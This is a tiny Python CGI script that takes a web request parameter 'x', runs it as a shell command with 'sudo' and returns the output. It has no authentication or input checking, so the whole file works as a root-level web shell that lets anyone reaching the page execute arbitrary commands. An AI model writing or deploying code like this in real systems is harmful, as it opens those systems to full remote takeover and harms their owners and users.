import cgi
import subprocess as sp

print("content-type: text/html")
print()

f=cgi.FieldStorage()
cmd=f.getvalue("x")

output=sp.getoutput("sudo " + cmd)
print(output)